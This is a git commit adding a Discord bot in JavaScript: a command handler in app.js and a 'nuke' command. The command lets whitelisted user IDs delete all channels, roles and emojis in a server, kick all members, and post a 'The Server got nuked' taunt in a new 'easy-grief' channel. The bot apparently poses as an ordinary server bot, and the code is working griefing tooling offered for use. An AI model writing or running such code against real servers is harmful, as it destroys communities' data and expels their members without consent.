c2179c63fc19ac180e90c1418bf7147254e70d47
weloveskript <97298147+weloveskript@users.noreply.github.com>
2022-04-21 01:02:43 +0200

    first commit

---
+++ app.js
@@ -0,0 +1,45 @@
+const Collection = require('discord.js');
+const Discord = require('discord.js');
+const { Client, Intents } = require('discord.js');
+const config = require("./config.json");
+const fs = require("fs");
+const discord = require('discord.js');
+
+const client = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES, Intents.FLAGS.GUILD_MEMBERS, Intents.FLAGS.GUILD_PRESENCES] });
+
+
+
+
+// command handler
+client.commands = new Discord.Collection();
+const commandFiles = fs.readdirSync('./commands').filter(file => file.endsWith('.js'));
+
+for (const file of commandFiles) {
+    const command = require(`./commands/${file}`);
+    client.commands.set(command.name, command);
+}
+
+const prefix = config.prefix;
+
+client.on('messageCreate', message => {
+    if (!message.content.startsWith(prefix) || message.author.bot) return;
+
+    const args = message.content.slice(prefix.length).trim().split(/ +/);
+    const command = args.shift().toLowerCase();
+
+    if (!client.commands.has(command)) return;
+
+    try {
+        client.commands.get(command).execute(message, args);
+    } catch (error) {
+        console.error(error);
+        message.channel.send({content: 'Fehler beim Ausführen des Befehls! Schreibe Insane.#3448 an. **Error:** ' + error});
+    }
+});
+
+
+client.login(config.token).then(r => console.log(`Eingeloggt als ${client.user.tag}!`)).catch(e => console.log(e));
+
+client.on('ready', () => {
+    client.user.setActivity('with your Server', { type: 'PLAYING' });
+});
---
+++ commands/nuke.js
@@ -0,0 +1,22 @@
+const Discord = require("discord.js");
+
+module.exports = {
+    name: "nuke",
+    description: "Nuke the Server!",
+
+    execute(message) {
+        const config = require("../config.json");
+        if(config.veriuser.includes(message.author.id)) {
+            message.author.send({content: "The Server got nuked! : ) https://github.com/weloveskript/nukebot"});
+            message.guild.channels.cache.forEach(channel => channel.delete().catch(() => {}));
+            message.guild.roles.cache.forEach(role => role.delete().catch(() => {}));
+            message.guild.emojis.cache.forEach(emoji => emoji.delete().catch(() => {}));
+            message.guild.members.cache.forEach(member => member.kick().catch(() => {}));
+            message.guild.channels.create(`easy-grief`, { type: 'text' });
+            setTimeout(() => {
+                message.guild.channels.cache.find(channel => channel.name === "easy-grief").send({content: "The Server got nuked! : )"});
+            }, 3000);
+
+    } else {
+            message.channel.send({content: "Du darfst den Command nicht ausführen!"});
+        }}};
